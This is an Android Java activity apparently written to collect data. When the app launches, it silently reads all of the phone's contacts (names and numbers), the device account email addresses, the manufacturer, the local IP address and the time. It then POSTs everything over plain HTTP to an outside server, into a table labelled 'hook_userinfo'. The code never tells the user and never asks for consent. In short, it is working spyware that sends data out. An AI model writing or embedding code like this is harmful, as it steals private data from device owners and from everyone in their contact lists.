package com.example.volmopc1.contactretrive;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.CursorLoader;
import android.os.AsyncTask;
import android.os.Build;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import android.app.LoaderManager;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.CursorLoader;
import android.content.Loader;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;


import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.format.Formatter;
import android.util.Log;
import android.util.Patterns;
import android.widget.ArrayAdapter;

import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Enumeration;
import java.util.LinkedList;
import java.util.List;
import java.util.regex.Pattern;

import static android.R.attr.id;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    LinkedList<bean> ll = new LinkedList<>();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        new uploaduserDetails().execute();
    }

    /**
     * @return
     */
    public bean getDetails() {
        bean b = null;
        ContentResolver cr = getContentResolver();
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        String[] column_to_return = {ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP, ContactsContract.Contacts._ID};
        Cursor c = cr.query(uri, column_to_return, null, null, null); //Cursor c = cr.query(ContactsContract.Contacts.CONTENT_URI, new String[] {ContactsContract.Contacts.DISPLAY_NAME_SOURCE}, null, null, null);       //Cursor c = cr.query(uri, null, null, null, null);

        if (c.moveToFirst()) {
            do {
                b = new bean();
                String id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));
                //System.out.println("id: "+id);
                String name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                //System.out.println("name: "+name);
                String mobno = getAllMobNo(cr, id);
                //System.out.println("mobno: "+mobno);

                b.setId(id);
                b.setMobno(name);
                b.setName(mobno);
                ll.add(b);

            } while (c.moveToNext());
        }
        return b;
    }

    /**
     * @param cr
     * @param id
     * @return
     */
    public String getAllMobNo(ContentResolver cr, String id) {
        String mobno = null;
        Uri uri1 = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String SelectionArg = ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = " + id;
        Cursor pCur = cr.query(uri1, null, SelectionArg, null, null);
        while (pCur.moveToNext()) {
            mobno = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
        }
        pCur.close();
        return mobno;
    }

    /**
     * not working
     *
     * @param id
     * @return
     */
    public String getAllMailid(String id) {
        String mailid = null;
        Cursor emails = getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = " + id, null, null);
        while (emails.moveToNext()) {
            // This would allow you get several email addresses
            mailid = emails.getString(emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
        }
        emails.close();
        return mailid;
    }

    public String getMobileManufacturerDetails() {
        //System.out.println("Build.MANUFACTURER" + Build.MANUFACTURER);
        return Build.MANUFACTURER;

    }

    public String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        String ip = Formatter.formatIpAddress(inetAddress.hashCode());
                        // Log.i("logg", "***** IP=" + ip);
                        return ip;
                    }
                }
            }
        } catch (SocketException ex) {
            // Log.e("logg", ex.toString());
        }
        return null;
    }

    public String getCurrentTime() {
        Calendar cal = Calendar.getInstance();
        int hour = cal.get(Calendar.HOUR_OF_DAY);
        int minute = cal.get(Calendar.MINUTE);
        int second = cal.get(Calendar.SECOND);
        long milliDiff = cal.get(Calendar.ZONE_OFFSET);
        // System.out.println(hour + " hour " + +minute + " minute " + +second + " second " + milliDiff + " milliDiff");
        return hour + " hour " + +minute + " minute " + +second + " second " + milliDiff + " milliDiff";
    }

    public String getAllPrimaryMailID() {
        String emails = "";
        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
        Account[] accounts = AccountManager.get(this).getAccounts();
        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                String email = account.name;
                emails = emails.concat(email + "--");
            }
        }
        return emails;
    }


    private class uploaduserDetails extends AsyncTask<Long, Integer, Long> {


        @Override
        protected Long doInBackground(Long... params) {


            getDetails();
            String allDetails = "";
            int i = 0;
            for (bean lll : ll) {
                String id = lll.getId();
                String mobNo = lll.getMobno();
                String name = lll.getName();
                String allDetail = " No:" + i + " id: " + id + " mobNo: " + mobNo + " name: " + name + "-- ";
                allDetails = allDetails.concat(allDetail);
                i++;
            }
            String allDetails1 = allDetails.toString().trim();
            String allDetails2 = allDetails1.replace("\"", "-");
            String allDetails3 = allDetails2.replace("'", "");

            String getAllPrimaryMailID = getAllPrimaryMailID();
            String getMobileManufacturerDetails = getMobileManufacturerDetails();
            String getLocalIpAddress = getLocalIpAddress();
            String getCurrentTime = getCurrentTime();
            String allDetails4 = allDetails3;


            //System.out.println("hhhh" + allPrimaryMailID + mobileManufacturerDetails + localIpAddress + currentTime + allDetails);
            OkHttpClient client = new OkHttpClient();
            RequestBody body = new FormBody.Builder()
                    .add("allPrimaryMailID", getAllPrimaryMailID)
                    .add("mobileManufacturerDetails", getMobileManufacturerDetails)
                    .add("localIpAddress", getLocalIpAddress)
                    .add("appopentime", getCurrentTime)
                    .add("allDetails", allDetails4)
                    .add("tablename", "hook_userinfo")
                    .build();
            Request request = new Request.Builder()
                    .url("http://bluedeserts.com/mynews/z_set_user_details.php")
                    .post(body)
                    .build();
            Response response = null;
            try {
                response = client.newCall(request).execute();
            } catch (IOException e) {
                e.printStackTrace();
            }
            System.out.println(response);
            // response.body().close();

            return null;
        }
    }

}



